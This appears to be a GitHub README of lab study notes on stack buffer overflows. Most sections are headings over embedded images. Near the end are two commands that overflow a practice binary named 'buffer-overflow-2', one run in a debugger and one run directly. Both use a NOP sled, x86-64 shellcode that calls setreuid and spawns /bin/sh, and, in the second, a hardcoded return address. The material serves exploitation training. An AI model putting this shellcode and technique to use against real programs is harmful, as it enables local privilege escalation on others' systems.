<h1>Buffer Overflow</h1>

![image](https://github.com/user-attachments/assets/b4e0bb2c-32da-4294-a102-3b35e3d02b20)

![image](https://github.com/user-attachments/assets/5bfde3a1-a1d6-48b5-a0c7-db75cc034e47)


<h2>Introduction</h2>

![image](https://github.com/user-attachments/assets/22c39b6d-3e68-45ca-9515-6ba0ae8753c4)

<h2>Process Layout</h2>

![image](https://github.com/user-attachments/assets/e2c0f388-2df4-486b-828d-f07fb8c42421)


<h2>x86-64 Procedures</h2>

![image](https://github.com/user-attachments/assets/21a2694e-4ccc-4d1e-86d6-8c000540a81b)


<h2>Procedures Continued</h2>

![image](https://github.com/user-attachments/assets/cc08f37d-ccd5-4179-ac32-19f90ce58696)

<h2>Endianess</h2>

![image](https://github.com/user-attachments/assets/ce6144b4-e320-4aa9-b461-19a30d1ed03c)


<h2>Overwriting Variables</h2>

![image](https://github.com/user-attachments/assets/edbbdd54-b261-4538-8dd4-b88a83ad1a28)


<h2>Overwriting Function Pointers</h2>

![image](https://github.com/user-attachments/assets/fc36d53e-4ae3-43f5-813e-764e35f688d2)

<br>
<h2>Buffer Overflows</h2>

![image](https://github.com/user-attachments/assets/83a118ec-4cdd-4f98-8ab4-91e1eeacf566)


<p>to be continued</p>


<br>
<h2>Buffer Overflows 2</h2>

![image](https://github.com/user-attachments/assets/dff71db4-0e60-41e9-9c51-83c40e6bced6)

![image](https://github.com/user-attachments/assets/9a6e21ab-93bd-4a5d-b7f2-f0501d14ad1c)

![image](https://github.com/user-attachments/assets/aef228ce-97a2-4438-a1ca-f2de52f77ff5)

![image](https://github.com/user-attachments/assets/9e8e2675-0583-48f6-acbd-c015bd1176ad)

<pre><code>run $(python -c "print('A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6)")</code></pre>

![image](https://github.com/user-attachments/assets/1995e8ea-eda0-40a4-be28-bd5665fd878b)

<pre><code>./buffer-overflow-2 $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\x78\xe2\xff\xff\xff\x7f')")
</code></pre>

![image](https://github.com/user-attachments/assets/6a745b72-f5c2-420a-bd9b-b89e5b7b019d)

















